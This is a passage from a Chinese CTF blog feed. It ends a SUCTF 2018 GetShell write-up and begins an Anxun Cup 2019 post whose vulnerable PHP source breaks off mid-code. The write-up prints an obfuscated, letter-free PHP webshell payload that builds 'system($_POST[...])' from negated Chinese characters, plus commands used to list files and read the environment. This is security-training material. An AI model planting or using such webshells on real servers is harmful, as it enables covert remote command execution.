punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>的<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>和<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#system</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span>样<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>说<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>小<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>次<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>站<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span>瞰<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#_POST</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$$___</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#system($_POST[system]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;$_&#x3D;[];$__.&#x3D;$_;$____&#x3D;$_&#x3D;&#x3D;$_;$___&#x3D;~茉[$____];$___.&#x3D;~内[$____];$___.&#x3D;~茉[$____];$___.&#x3D;~苏[$____];$___.&#x3D;~的[$____];$___.&#x3D;~咩[$____];$_____&#x3D;_;$_____.&#x3D;~课[$____];$_____.&#x3D;~尬[$____];$_____.&#x3D;~笔[$____];$_____.&#x3D;~端[$____];$__________&#x3D;$$_____;$___($__________[~瞎[$____]]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a&#x3D;ls &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814190038386.png"></p><p>百度了下说环境有问题，flag没写进去</p><p>不过写到env里面了，执行下</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814190127237.png"></p><p>就有了。</p><p>这里是利用了**变量函数(variable-functions)**，可以用system，但不能于eval</p><blockquote><p>system是个函数。可以动态调用。而eval是PHP语法的一部分。并不是函数。不能动态调用。类似的还有echo，print，unset()，isset()，empty()，include，require都是PHP语法构造一部分。</p></blockquote><h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p><a href="https://guokeya.github.io/post/suctf-2018getshellwu-shu-zi-zi-mu-webshell/">https://guokeya.github.io/post/suctf-2018getshellwu-shu-zi-zi-mu-webshell/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[安洵杯 2019]不是文件上传</title>
      <link href="/p/893436503.html"/>
      <url>/p/893436503.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150054232.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150302414.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>主页注释，第一时间想到git泄漏</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150330358.png"></p><p>试了下，没有</p><p>没想到竟然是上github搜这个</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150557807.png"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>show.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">show</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$con</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>id="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" filename="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" path="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>You have not uploaded an image yet.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">upload</span> <span class="token keyword">extends</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>helper.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pic/"</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"config.txt"</span><span class="token punctuation">;</span><span class="token comment">// The function is not yet perfect, it is not open yet.</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"width"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"height"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'title'</span><span class="token operator">=></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'filename'</span><span class="token operator">=></span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ext'</span><span class="token operator">=></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'path'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">folder</span><span class="token operator">.</span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"`"</span><span class="token operator">.</span><span class="token variable">$key_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$value_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO images ("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">") VALUES("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token 